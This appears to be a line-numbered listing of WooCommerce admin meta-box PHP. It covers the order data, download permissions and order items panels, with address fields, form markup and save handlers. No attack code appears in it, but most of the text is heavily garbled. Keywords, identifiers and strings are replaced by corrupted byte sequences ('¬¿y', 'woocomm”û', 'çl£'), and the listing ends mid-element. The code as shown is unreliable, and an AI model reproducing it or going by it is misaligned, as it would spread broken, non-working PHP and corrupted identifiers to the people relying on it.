48 'c™y' => 
	`¬¿y
(

49 'Ïb–' => 
	`__
( 'City', 'woocommerce' ),

50 'show' => 
çl£


52 'po¡code' => 
	`¬¿y
(

53 'Ïb–' => 
	`__
( 'Postcode', 'woocommerce' ),

54 'show' => 
çl£


56 'couÁry' => 
	`¬¿y
(

57 'Ïb–' => 
	`__
( 'Country', 'woocommerce' ),

58 'show' => 
çl£
,

60 'İtiÚs' => 
	`¬¿y
Ğ'' => 
	`__
Ğ'S–eù‡ couÁry&h–l;', 'woocomm”û' ) ) + 
	`WC
()->
couÁr›s
->
	`g‘_®lowed_couÁr›s
()

62 '¡©e' => 
	`¬¿y
(

63 'Ïb–' => 
	`__
( 'State/County', 'woocommerce' ),

64 'show' => 
çl£


66 'ema' => 
	`¬¿y
(

67 'Ïb–' => 
	`__
( 'Email', 'woocommerce' ),

69 'phÚe' => 
	`¬¿y
(

70 'Ïb–' => 
	`__
( 'Phone', 'woocommerce' ),

74 
£lf
::
$shpšg_f›lds
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_admš_shpšg_f›lds', 
	`¬¿y
(

75 'fœ¡_Çme' => 
	`¬¿y
(

76 'Ïb–' => 
	`__
( 'First Name', 'woocommerce' ),

77 'show' => 
çl£


79 'Ï¡_Çme' => 
	`¬¿y
(

80 'Ïb–' => 
	`__
( 'Last Name', 'woocommerce' ),

81 'show' => 
çl£


83 'com·ny' => 
	`¬¿y
(

84 'Ïb–' => 
	`__
( 'Company', 'woocommerce' ),

85 'show' => 
çl£


87 'add»ss_1' => 
	`¬¿y
(

88 'Ïb–' => 
	`__
( 'Address 1', 'woocommerce' ),

89 'show' => 
çl£


91 'add»ss_2' => 
	`¬¿y
(

92 'Ïb–' => 
	`__
( 'Address 2', 'woocommerce' ),

93 'show' => 
çl£


95 'c™y' => 
	`¬¿y
(

96 'Ïb–' => 
	`__
( 'City', 'woocommerce' ),

97 'show' => 
çl£


99 'po¡code' => 
	`¬¿y
(

100 'Ïb–' => 
	`__
( 'Postcode', 'woocommerce' ),

101 'show' => 
çl£


103 'couÁry' => 
	`¬¿y
(

104 'Ïb–' => 
	`__
( 'Country', 'woocommerce' ),

105 'show' => 
çl£
,

107 'İtiÚs' => 
	`¬¿y
Ğ'' => 
	`__
Ğ'S–eù‡ couÁry&h–l;', 'woocomm”û' ) ) + 
	`WC
()->
couÁr›s
->
	`g‘_shpšg_couÁr›s
()

109 '¡©e' => 
	`¬¿y
(

110 'Ïb–' => 
	`__
( 'State/County', 'woocommerce' ),

111 'show' => 
çl£


119 
public
 
funùiÚ
 
	$ouut
Ğ
$po¡
 ) {

120 
glob®
 
$theÜd”
;

122 iàĞ! 
	`is_objeù
Ğ
$theÜd”
 ) )

123 
$theÜd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$po¡
->
ID
 );

125 
$Üd”
 = 
$theÜd”
;

127 
£lf
::
	`š™_add»ss_f›lds
();

129 
	`wp_nÚû_f›ld
( 'woocommerce_save_data', 'woocommerce_meta_nonce' );

131 <
¡yË
 
ty³
="text/css">

132 #po¡-
body
-
cÚ‹Á
, #t™Ëdiv, #majÜ-
publishšg
-
aùiÚs
, #mšÜ-publishšg-aùiÚs, #visib™y, #subm™div { 
di¥Ïy
:
nÚe
 }

133 </
¡yË
>

134 <
div
 
şass
="panel-wrap woocommerce">

135 <
šput
 
Çme
="po¡_t™Ë" 
ty³
="hidd’" 
v®ue
="<?phpƒchoƒmpty( $post->post_title ) ? 'Order' :ƒsc_attr( $post->post_title ); ?>" />

136 <
šput
 
Çme
="po¡_¡©us" 
ty³
="hidd’" 
v®ue
="publish" />

137 <
div
 
id
="Üd”_d©a" 
şass
="panel">

139 <
h2
><?
php
 
	`_e
( 'Order Details', 'woocommerce' ); ?></h2>

140 <
p
 
şass
="Üd”_numb”"><?
php


142 
echo
 
	`__
Ğ'Ord”‚umb”', 'woocomm”û' ) . ' ' . 
	`esc_html
Ğ
$Üd”
->
	`g‘_Üd”_numb”
() ) . '. ';

144 iàĞ
$_add»ss
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_cu¡om”__add»ss', 
Œue
 ) )

145 
echo
 
	`__
Ğ'Cu¡om” IP:', 'woocomm”û' ) . ' ' . 
	`esc_html
Ğ
$_add»ss
 );

146 ?></
p
>

148 <
div
 
şass
="order_data_column_container">

149 <
div
 
şass
="order_data_column">

150 <
h4
><?
php
 
	`_e
( 'General Details', 'woocommerce' ); ?></h4>

152 <
p
 
şass
="fÜm-f›ld fÜm-f›ld-wide"><
Ïb–
 ="Üd”_d©e"><?
php
 
	`_e
( 'Order date:', 'woocommerce' ) ?></label>

153 <
šput
 
ty³
="‹xt" 
şass
="d©e-pick”-f›ld" 
Çme
="Üd”_d©e" 
id
="Üd”_d©e" 
maxËngth
="10" 
v®ue
="<?ph°echØd©e_i18nĞ'Y-m-d', sŒtÙimeĞ$po¡->po¡_d©è); ?>" 
·‰”n
="[0-9]{4}-(0[1-9]|1[012])-(0[1-9]|1[0-9]|2[0-9]|3[01])" />@<špuˆty³="‹xt" cÏss="hour" 
¶aûhŞd”
="<?ph°_eĞ'h', 'woocomm”û' ) ?>"‚ame="Üd”_d©e_hour" id="Üd”_d©e_hour" maxËngth="2" 
size
="2" value="<?phpƒcho date_i18n( 'H', strtotime( $post->post_date ) ); ?>"…attern="\-?\d+(\.\d{0,})?" />:<inputype="text" class="minute"…laceholder="<?php _e( 'm', 'woocommerce' ) ?>"‚ame="order_date_minute" id="order_date_minute" maxlength="2" size="2" value="<?phpƒcho date_i18n( 'i', strtotime( $post->post_date ) ); ?>"…attern="\-?\d+(\.\d{0,})?" />

154 </
p
>

156 <
p
 
şass
="fÜm-f›ld fÜm-f›ld-wide"><
Ïb–
 ="Üd”_¡©us"><?
php
 
	`_e
( 'Order status:', 'woocommerce' ) ?></label>

157 <
£Ëù
 
id
="Üd”_¡©us" 
Çme
="Üd”_¡©us" 
şass
="chosen_select">

158 <?
php


159 
$¡©u£s
 = (
¬¿y
è
	`g‘_‹rms
Ğ'shİ_Üd”_¡©us', 
	`¬¿y
( 'hide_empty' => 0, 'orderby' => 'id' ) );

160 
	`fÜ—ch
 ( 
$¡©u£s
 
as
 
$¡©us
 ) {

161 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$¡©us
->
¦ug
 ) . '" ' . 
	`£Ëùed
Ğ$¡©us->¦ug, 
$Üd”
->
¡©us
, 
çl£
 ) . '>' . 
	`esc_html__
Ğ$¡©us->
Çme
, 'woocommerce' ) . '</option>';

164 </
£Ëù
></
p
>

166 <
p
 
şass
="form-field form-field-wide">

167 <
Ïb–
 ="cu¡om”_u£r"><?
php
 
	`_e
( 'Customer:', 'woocommerce' ) ?></label>

168 <
£Ëù
 
id
="cu¡om”_u£r" 
Çme
="cu¡om”_u£r" 
şass
="ajax_chosen_select_customer">

169 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'Guest', 'woocommerce' ) ?></option>

170 <?
php


171 iàĞ
$Üd”
->
cu¡om”_u£r
 ) {

172 
$u£r
 = 
	`g‘_u£r_by
Ğ'id', 
$Üd”
->
cu¡om”_u£r
 );

173 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$u£r
->
ID
 ) . '" ' . 
	`£Ëùed
Ğ1, 1, 
çl£
 ) . '>' . 
	`esc_html
Ğ$u£r->
di¥Ïy_Çme
 ) . ' (#' . 
	`absšt
Ğ$u£r->ID ) . ' &ndash; ' .ƒsc_htmlĞ$u£r->
u£r_ema
 ) . ')</option>';

176 </
£Ëù
>

177 </
p
>

179 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_admš_Üd”_d©a_aá”_Üd”_d‘as', 
$Üd”
 ); ?>

180 </
div
>

181 <
div
 
şass
="order_data_column">

182 <
h4
><?
php
 
	`_e
Ğ'Blšg D‘as', 'woocomm”û' ); ?> <
a
 
şass
="ed™_add»ss" 
h»f
="#"><
img
 
¤c
="<?ph°echØWC()->¶ugš_u¾(); ?>/as£ts/images/icÚs/ed™.²g" 
®t
="Ed™" 
width
="14" /></a></h4>

183 <?
php


185 
echo
 '<div class="address">';

187 iàĞ
$Üd”
->
	`g‘_fÜm©‹d_blšg_add»ss
() )

188 
echo
 '<p><¡rÚg>' . 
	`__
Ğ'Add»ss', 'woocomm”û' ) . ':</¡rÚg>' . 
	`wp_k£s
Ğ
$Üd”
->
	`g‘_fÜm©‹d_blšg_add»ss
(), 
	`¬¿y
( 'br' =>‡rray() ) ) . '</p>';

190 
echo
 '<°şass="nÚe_£t"><¡rÚg>' . 
	`__
( 'Address', 'woocommerce' ) . ':</strong> ' . __( 'No billing‡ddress set.', 'woocommerce' ) . '</p>';

192 
	`fÜ—ch
 ( 
£lf
::
$blšg_f›lds
 
as
 
$key
 => 
$f›ld
 ) {

193 iàĞ
	`is£t
Ğ
$f›ld
['show'] ) && $f›ld['show'] ==ğ
çl£
 )

196 
$f›ld_Çme
 = 'blšg_' . 
$key
;

198 iàĞ
$Üd”
->
$f›ld_Çme
 )

199 
echo
 '<p><¡rÚg>' . 
	`esc_html
Ğ
$f›ld
['Ïb–'] ) . ':</¡rÚg> ' . 
	`make_şickabË
Ğesc_htmlĞ
$Üd”
->
$f›ld_Çme
 ) ) . '</p>';

202 iàĞ
	`WC
()->
	`·ym’t_g©eways
() )

203 
$·ym’t_g©eways
 = 
	`WC
()->
·ym’t_g©eways
->
	`·ym’t_g©eways
();

205 
$·ym’t_m‘hod
 = ! 
	`em±y
Ğ
$Üd”
->
·ym’t_m‘hod
 ) ? $order->payment_method : '';

207 iàĞ
$·ym’t_m‘hod
 )

208 
echo
 '<p><¡rÚg>' . 
	`__
Ğ'Paym’ˆM‘hod', 'woocomm”û' ) . ':</¡rÚg> ' . ( 
	`is£t
Ğ
$·ym’t_g©eways
[ 
$·ym’t_m‘hod
 ] ) ? 
	`esc_html
Ğ$·ym’t_g©eways[ $·ym’t_m‘hod ]->
	`g‘_t™Ë
() ) :ƒsc_html( $payment_method ) ) . '</p>';

210 
echo
 '</div>';

213 
echo
 '<div cÏss="ed™_add»ss"><p><bu‰Ú cÏss="bu‰Ú†ßd_cu¡om”_blšg">'.
	`__
( 'Load billing‡ddress', 'woocommerce' ).'</button></p>';

215 
	`fÜ—ch
 ( 
£lf
::
$blšg_f›lds
 
as
 
$key
 => 
$f›ld
 ) {

216 iàĞ! 
	`is£t
Ğ
$f›ld
['type'] ) )

217 
$f›ld
['type'] = 'text';

218  
$f›ld
['type'] ) {

220 
	`woocomm”û_wp_£Ëù
Ğ
	`¬¿y
Ğ'id' => '_blšg_' . 
$key
, 'Ïb–' => 
$f›ld
['label'], 'options' => $field['options'] ) );

223 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => '_blšg_' . 
$key
, 'Ïb–' => 
$f›ld
['label'] ) );

229 <
p
 
şass
="form-field form-field-wide">

230 <
Ïb–
><?
php
 
	`_e
( 'Payment Method:', 'woocommerce' ); ?></label>

231 <
£Ëù
 
Çme
="_·ym’t_m‘hod" 
id
="_·ym’t_m‘hod" 
şass
="first">

232 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'N/A', 'woocommerce' ); ?></option>

233 <?
php


234 
$found_m‘hod
 = 
çl£
;

236 
	`fÜ—ch
 ( 
$·ym’t_g©eways
 
as
 
$g©eway
 ) {

237 iàĞ
$g©eway
->
’abËd
 == "yes" ) {

238 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$g©eway
->
id
 ) . '" ' . 
	`£Ëùed
Ğ
$·ym’t_m‘hod
, $g©eway->id, 
çl£
 ) . '>' . 
	`esc_html
Ğ$g©eway->
	`g‘_t™Ë
() ) . '</option>';

239 iàĞ
$·ym’t_m‘hod
 =ğ
$g©eway
->
id
 )

240 
$found_m‘hod
 = 
Œue
;

244 iàĞ! 
$found_m‘hod
 && ! 
	`em±y
Ğ
$·ym’t_m‘hod
 ) ) {

245 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$·ym’t_m‘hod
 ) . '" s–eùed="£Ëùed">' . 
	`__
( 'Other', 'woocommerce' ) . '</option>';

247 
echo
 '<İtiÚ v®ue="Ùh”">' . 
	`__
( 'Other', 'woocommerce' ) . '</option>';

250 </
£Ëù
>

251 </
p
>

252 <?
php


254 
echo
 '</div>';

256 
	`do_aùiÚ
Ğ'woocomm”û_admš_Üd”_d©a_aá”_blšg_add»ss', 
$Üd”
 );

258 </
div
>

259 <
div
 
şass
="order_data_column">

261 <
h4
><?
php
 
	`_e
Ğ'Shpšg D‘as', 'woocomm”û' ); ?> <
a
 
şass
="ed™_add»ss" 
h»f
="#"><
img
 
¤c
="<?ph°echØWC()->¶ugš_u¾(); ?>/as£ts/images/icÚs/ed™.²g" 
®t
="Ed™" 
width
="14" /></a></h4>

262 <?
php


264 
echo
 '<div class="address">';

266 iàĞ
$Üd”
->
	`g‘_fÜm©‹d_shpšg_add»ss
() )

267 
echo
 '<p><¡rÚg>' . 
	`__
Ğ'Add»ss', 'woocomm”û' ) . ':</¡rÚg>' . 
	`wp_k£s
Ğ
$Üd”
->
	`g‘_fÜm©‹d_shpšg_add»ss
(), 
	`¬¿y
( 'br' =>‡rray() ) ) . '</p>';

269 
echo
 '<°şass="nÚe_£t"><¡rÚg>' . 
	`__
( 'Address', 'woocommerce' ) . ':</strong> ' . __( 'No shipping‡ddress set.', 'woocommerce' ) . '</p>';

271 iàĞ
£lf
::
$shpšg_f›lds
 ) 
	`fÜ—ch
 ( s–f::$shpšg_f›ld 
as
 
$key
 => 
$f›ld
 ) {

272 iàĞ
	`is£t
Ğ
$f›ld
['show'] ) && $f›ld['show'] ==ğ
çl£
 )

275 
$f›ld_Çme
 = 'shpšg_' . 
$key
;

277 iàĞ! 
	`em±y
Ğ
$Üd”
->
$f›ld_Çme
 ) )

278 
echo
 '<p><¡rÚg>' . 
	`esc_html
Ğ
$f›ld
['Ïb–'] ) . ':</¡rÚg> ' . 
	`make_şickabË
Ğesc_htmlĞ
$Üd”
->
$f›ld_Çme
 ) ) . '</p>';

281 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_’abË_Üd”_nÙes_f›ld', 
	`g‘_İtiÚ
Ğ'woocomm”û_’abË_Üd”_comm’ts', 'yes' ) =ğ'yes' ) && 
$po¡
->
po¡_exû½t
 )

282 
echo
 '<p><¡rÚg>' . 
	`__
Ğ'Cu¡om” NÙe', 'woocomm”û' ) . ':</¡rÚg> ' . 
	`Æ2br
Ğ
	`esc_html
Ğ
$po¡
->
po¡_exû½t
 ) ) . '</p>';

284 
echo
 '</div>';

287 
echo
 '<div cÏss="ed™_add»ss"><p><bu‰Ú cÏss="bu‰Ú†ßd_cu¡om”_shpšg">' . 
	`__
( 'Load shipping‡ddress', 'woocommerce' ) . '</button> <button class="button billing-same-as-shipping">'. __( 'Copy from billing', 'woocommerce' ) . '</button></p>';

289 iàĞ
£lf
::
$shpšg_f›lds
 ) 
	`fÜ—ch
 ( s–f::$shpšg_f›ld 
as
 
$key
 => 
$f›ld
 ) {

290 iàĞ! 
	`is£t
Ğ
$f›ld
['type'] ) )

291 
$f›ld
['type'] = 'text';

292  
$f›ld
['type'] ) {

294 
	`woocomm”û_wp_£Ëù
Ğ
	`¬¿y
Ğ'id' => '_shpšg_' . 
$key
, 'Ïb–' => 
$f›ld
['label'], 'options' => $field['options'] ) );

297 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => '_shpšg_' . 
$key
, 'Ïb–' => 
$f›ld
['label'] ) );

302 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_’abË_Üd”_nÙes_f›ld', 
	`g‘_İtiÚ
( 'woocommerce_enable_order_comments', 'yes' ) == 'yes' ) ) {

304 <
p
 
şass
="fÜm-f›ld fÜm-f›ld-wide"><
Ïb–
 ="exû½t"><?
php
 
	`_e
( 'Customer Note:', 'woocommerce' ) ?></label>

305 <
‹x»a
 
rows
="1" 
cŞs
="40" 
Çme
="exû½t" 
bšdex
="6" 
id
="exû½t" 
¶aûhŞd”
="<?ph°_eĞ'Cu¡om”\' nÙe abouˆthÜd”', 'woocomm”û' ); ?>"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$po¡
->
po¡_exû½t
 ); ?></‹x»a></
p
>

306 <?
php


309 
echo
 '</div>';

311 
	`do_aùiÚ
Ğ'woocomm”û_admš_Üd”_d©a_aá”_shpšg_add»ss', 
$Üd”
 );

313 </
div
>

314 </
div
>

315 <
div
 
şass
="clear"></div>

316 </
div
>

317 </
div
>

318 <?
php


321 
	`wc_’queue_js
( "

322 
	`jQu”y
('£Ëù.ajax_cho£n_£Ëù_cu¡om”').
	`ajaxCho£n
({

323 
m‘hod
: 'GET',

324 
u¾
: '" .‡dmš_u¾('
admš
-
ajax
.
php
') . "',

325 
d©aTy³
: 'json',

326 
aá”Ty³D–ay
: 100,

327 
mšT”mL’gth
: 1,

328 
d©a
: {

329 
aùiÚ
: 'woocommerce_json_search_customers',

330 
£cur™y
: '" . wp_create_nonce("search-customers") . "'

332 }, 
	`funùiÚ
 (
d©a
) {

334 
v¬
 
‹rms
 = {};

336 
$
.
	`—ch
(
d©a
, 
	`funùiÚ
 (
i
, 
v®
) {

337 
‹rms
[
i
] = 
v®
;

340  
‹rms
;

343 
	}
}

348 
public
 
funùiÚ
 
	$§ve
Ğ
$po¡_id
, 
$po¡
 ) {

349 
glob®
 
$wpdb
;

351 
£lf
::
	`š™_add»ss_f›lds
();

354 
	`add_po¡_m‘a
Ğ
$po¡_id
, '_Üd”_key', 
	`uniqid
Ğ'Üd”_' ), 
Œue
 );

357 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_cu¡om”_u£r', 
	`absšt
Ğ
$_POST
['customer_user'] ) );

359 iàĞ
£lf
::
$blšg_f›lds
 )

360 
	`fÜ—ch
 ( 
£lf
::
$blšg_f›lds
 
as
 
$key
 => 
$f›ld
 )

361 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_blšg_' . 
$key
, 
	`wc_ş—n
Ğ
$_POST
[ '_billing_' . $key ] ) );

363 iàĞ
£lf
::
$shpšg_f›lds
 )

364 
	`fÜ—ch
 ( 
£lf
::
$shpšg_f›lds
 
as
 
$key
 => 
$f›ld
 )

365 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_shpšg_' . 
$key
, 
	`wc_ş—n
Ğ
$_POST
[ '_shipping_' . $key ] ) );

368 iàĞ
	`g‘_po¡_m‘a
Ğ
$po¡_id
, '_·ym’t_m‘hod', 
Œue
 ) !=ğ
	`¡r¦ashes
Ğ
$_POST
['_payment_method'] ) ) {

370 
$m‘hods
 = 
	`WC
()->
·ym’t_g©eways
->
	`·ym’t_g©eways
();

371 
$·ym’t_m‘hod
 = 
	`wc_ş—n
Ğ
$_POST
['_payment_method'] );

372 
$·ym’t_m‘hod_t™Ë
 = 
$·ym’t_m‘hod
;

374 iàĞ
	`is£t
Ğ
$m‘hods
è&& is£tĞ$m‘hods[ 
$·ym’t_m‘hod
 ] ) )

375 
$·ym’t_m‘hod_t™Ë
 = 
$m‘hods
[ 
$·ym’t_m‘hod
 ]->
	`g‘_t™Ë
();

377 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_·ym’t_m‘hod', 
$·ym’t_m‘hod
 );

378 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_·ym’t_m‘hod_t™Ë', 
$·ym’t_m‘hod_t™Ë
 );

382 iàĞ
	`em±y
Ğ
$_POST
['order_date'] ) ) {

383 
$d©e
 = 
	`cu¼’t_time
('timestamp');

385 
$d©e
 = 
	`¡¹Ùime
Ğ
$_POST
['order_date'] . ' ' . () $_POST['order_date_hour'] . ':' . () $_POST['order_date_minute'] . ':00' );

388 
$d©e
 = 
	`d©e_i18n
( 'Y-m-d H:i:s', $date );

390 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"UPDATE $wpdb->po¡ SET…o¡_d©ğ%s,…o¡_d©e_gmˆğ% WHERE ID = %s", 
$d©e
, 
	`g‘_gmt_äom_d©e
Ğ$d©), 
$po¡_id
 ) );

393 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$po¡_id
 );

396 
$Üd”
->
	`upd©e_¡©us
Ğ
$_POST
['order_status'] );

398 
	`wc_d–‘e_shİ_Üd”_Œªs›Ás
Ğ
$po¡_id
 );

399 
	}
}

	@includes/admin/post-types/meta-boxes/class-wc-meta-box-order-downloads.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_M‘a_Box_Ord”_DowÆßds
 {

21 
public
 
funùiÚ
 
	$ouut
Ğ
$po¡
 ) {

22 
glob®
 
$woocomm”û
, 
$po¡
, 
$wpdb
;

24 <
div
 
şass
="order_download_permissions wc-metaboxes-wrapper">

26 <
div
 
şass
="wc-metaboxes">

27 <?
php


28 
$dowÆßd_³rmissiÚs
 = 
$wpdb
->
	`g‘_»suÉs
Ğ$wpdb->
	`´•¬e
( "

29 
SELECT
 * 
FROM
 {
$wpdb
->
´efix
}
woocomm”û_dowÆßdabË_´oduù_³rmissiÚs


30 
WHERE
 
Üd”_id
 = %
d
 
ORDER
 
BY
 
´oduù_id


33 
$´oduù
 = 
nuÎ
;

34 
$loİ
 = 0;

35 iàĞ
$dowÆßd_³rmissiÚs
 && Ğ$dowÆßd_³rmissiÚ è> 0 ) 
	`fÜ—ch
 ( $dowÆßd_³rmissiÚ 
as
 
$dowÆßd
 ) {

37 iàĞ! 
$´oduù
 || $´oduù->
id
 !ğ
$dowÆßd
->
´oduù_id
 ) {

38 
$´oduù
 = 
	`g‘_´oduù
Ğ
	`absšt
Ğ
$dowÆßd
->
´oduù_id
 ) );

39 
$fe_couÁ”
 = 1;

43 iàĞ! 
$´oduù
 || ! $´oduù->
	`exi¡s
(è|| ! $´oduù->
	`has_fe
Ğ
$dowÆßd
->
dowÆßd_id
 ) )

47 
$fe
 = 
$´oduù
->
	`g‘_fe
Ğ
$dowÆßd
->
dowÆßd_id
 );

48 iàĞ
	`is£t
Ğ
$fe
['name'] ) ) {

49 
$fe_couÁ
 = 
$fe
['name'];

51 
$fe_couÁ
 = 
	`¥rštf
Ğ
	`__
Ğ'F%d', 'woocomm”û' ), 
$fe_couÁ”
 );

54 
	`šşude
( 'views/html-order-download-permission.php' );

56 
$loİ
++;

57 
$fe_couÁ”
++;

60 </
div
>

62 <
div
 
şass
="toolbar">

63 <
p
 
şass
="buttons">

64 <
£Ëù
 
Çme
="g¿Á_acûss_id" 
id
="g¿Á_acûss_id" 
şass
="ajax_cho£n_£Ëù_dowÆßdabË_´oduùs_ªd_v¬ŸtiÚs" 
muÉË
="muÉË" 
d©a
-
¶aûhŞd”
="<?ph°_eĞ'S—rch fÜ‡ dowÆßdabË…roduù&h–l;', 'woocomm”û' ) ?>" 
¡yË
="width: 400px"></select>

65 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="bu‰Ú g¿Á_acûss"><?
php
 
	`_e
( 'Grant Access', 'woocommerce' ); ?></button>

66 </
p
>

67 <
div
 
şass
="clear"></div>

68 </
div
>

70 </
div
>

71 <?
php


77 
public
 
funùiÚ
 
	$§ve
Ğ
$po¡_id
, 
$po¡
 ) {

78 
glob®
 
$wpdb
, 
$woocomm”û
;

80 iàĞ
	`is£t
Ğ
$_POST
['download_id'] ) ) {

83 
$dowÆßd_ids
 = 
$_POST
['download_id'];

84 
$´oduù_ids
 = 
$_POST
['product_id'];

85 
$dowÆßds_»maššg
 = 
$_POST
['downloads_remaining'];

86 
$acûss_expœes
 = 
$_POST
['access_expires'];

89 
$Üd”_key
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_Üd”_key', 
Œue
 );

90 
$cu¡om”_ema
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_blšg_ema', 
Œue
 );

91 
$cu¡om”_u£r
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_cu¡om”_u£r', 
Œue
 );

92 
$´oduù_ids_couÁ
 = Ğ
$´oduù_ids
 );

94  
$i
 = 0; $˜< 
$´oduù_ids_couÁ
; $i ++ ) {

95 iàĞ! 
	`is£t
Ğ
$´oduù_ids
[ 
$i
 ] ) )

98 
$d©a
 = 
	`¬¿y
(

99 'u£r_id' => 
	`absšt
Ğ
$cu¡om”_u£r
 ),

100 'u£r_ema' => 
	`wc_ş—n
Ğ
$cu¡om”_ema
 ),

101 'dowÆßds_»maššg' => 
	`wc_ş—n
Ğ
$dowÆßds_»maššg
[ 
$i
 ] )

104 
$fÜm©
 = 
	`¬¿y
( '%d', '%s', '%s' );

106 
$expœy
 = ( 
	`¬¿y_key_exi¡s
Ğ
$i
, 
$acûss_expœes
 ) && $acûss_expœes[ $˜] !ğ'' ) ? 
	`d©e_i18n
Ğ'Y-m-d', 
	`¡¹Ùime
Ğ$acûss_expœes[ $˜] ) ) : 
nuÎ
;

108 iàĞ! 
	`is_nuÎ
Ğ
$expœy
 ) ) {

109 
$d©a
['acûss_expœes'] = 
$expœy
;

110 
$fÜm©
[] = '%s';

113 
$wpdb
->
	`upd©e
Ğ$wpdb->
´efix
 . "woocommerce_downloadable_product_permissions",

114 
$d©a
,

115 
	`¬¿y
(

116 'Üd”_id' => 
$po¡_id
,

117 '´oduù_id' => 
	`absšt
Ğ
$´oduù_ids
[ 
$i
 ] ),

118 'dowÆßd_id' => 
	`wc_ş—n
Ğ
$dowÆßd_ids
[ 
$i
 ] )

120 
$fÜm©
, 
	`¬¿y
( '%d', '%d', '%s' )

125 
	}
}

	@includes/admin/post-types/meta-boxes/class-wc-meta-box-order-items.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_M‘a_Box_Ord”_I‹ms
 {

20 
public
 
funùiÚ
 
	$ouut
Ğ
$po¡
 ) {

21 
glob®
 
$wpdb
, 
$th•o¡id
, 
$theÜd”
, 
$woocomm”û
;

23 iàĞ! 
	`is_objeù
Ğ
$theÜd”
 ) )

24 
$theÜd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$th•o¡id
 );

26 
$Üd”
 = 
$theÜd”
;

28 <
div
 
şass
="woocommerce_order_items_wrapper">

29 <
bË
 
ûÎ·ddšg
="0" 
ûÎ¥acšg
="0" 
şass
="woocommerce_order_items">

30 <
th—d
>

31 <
Œ
>

32 <
th
><
šput
 
ty³
="checkbox" 
şass
="check-column" /></th>

33 <
th
 
şass
="™em" 
cŞ¥ª
="2"><?
php
 
	`_e
( 'Item', 'woocommerce' ); ?></th>

35 <?
php
 
	`do_aùiÚ
( 'woocommerce_admin_order_item_headers' ); ?>

37 <?
php
 iàĞ
	`g‘_İtiÚ
( 'woocommerce_calc_taxes' ) == 'yes' ) : ?>

38 <
th
 
şass
="x_şass"><?
php
 
	`_e
( 'Tax&nbsp;Class', 'woocommerce' ); ?></th>

39 <?
php
 
’dif
; ?>

41 <
th
 
şass
="quªt™y"><?
php
 
	`_e
( 'Qty', 'woocommerce' ); ?></th>

43 <
th
 
şass
="lše_co¡"><?
php
 
	`_e
( 'Total', 'woocommerce' ); ?></th>

45 <?
php
 iàĞ
	`g‘_İtiÚ
( 'woocommerce_calc_taxes' ) == 'yes' ) : ?>

46 <
th
 
şass
="lše_x"><?
php
 
	`_e
( 'Tax', 'woocommerce' ); ?></th>

47 <?
php
 
’dif
; ?>

49 <
th
 
width
="1%">&
nb¥
;</th>

50 </
Œ
>

51 </
th—d
>

52 <
tbody
 
id
="order_items_list">

54 <?
php


56 
$Üd”_™ems
 = 
$Üd”
->
	`g‘_™ems
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_admš_Üd”_™em_ty³s', 
	`¬¿y
( 'line_item', 'fee' ) ) );

58 
	`fÜ—ch
 ( 
$Üd”_™ems
 
as
 
$™em_id
 => 
$™em
 ) {

60  
$™em
['type'] ) {

62 
$_´oduù
 = 
$Üd”
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 );

63 
$™em_m‘a
 = 
$Üd”
->
	`g‘_™em_m‘a
Ğ
$™em_id
 );

65 
	`šşude
( 'views/html-order-item.php' );

68 
	`šşude
( 'views/html-order-fee.php' );

72 
	`do_aùiÚ
Ğ'woocomm”û_Üd”_™em_' . 
$™em
['ty³'] . '_html', 
$™em_id
, $item );

75 </
tbody
>

76 </
bË
>

77 </
div
>

79 <
p
 
şass
="bulk_actions">

80 <
£Ëù
>

81 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'Actions', 'woocommerce' ); ?></option>

82 <
İtgroup
 
Ïb–
="<?php _e( 'Edit', 'woocommerce' ); ?>">

83 <
İtiÚ
 
v®ue
="d–‘e"><?
php
 
	`_e
( 'Delete Lines', 'woocommerce' ); ?></option>

84 </
İtgroup
>

85 <
İtgroup
 
Ïb–
="<?php _e( 'Stock Actions', 'woocommerce' ); ?>">

86 <
İtiÚ
 
v®ue
="»duû_¡ock"><?
php
 
	`_e
( 'Reduce Line Stock', 'woocommerce' ); ?></option>

87 <
İtiÚ
 
v®ue
="šü—£_¡ock"><?
php
 
	`_e
( 'Increase Line Stock', 'woocommerce' ); ?></option>

88 </
İtgroup
>

89 </
£Ëù
>

91 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="bu‰Ú do_bulk_aùiÚ wc-»lßd" 
t™Ë
="<?ph°_eĞ'Aµly', 'woocomm”û' ); ?>"><
¥ª
><?
php
 
	`_e
( 'Apply', 'woocommerce' ); ?></span></button>

92 </
p
>

94 <
p
 
şass
="add_items">

95 <
£Ëù
 
id
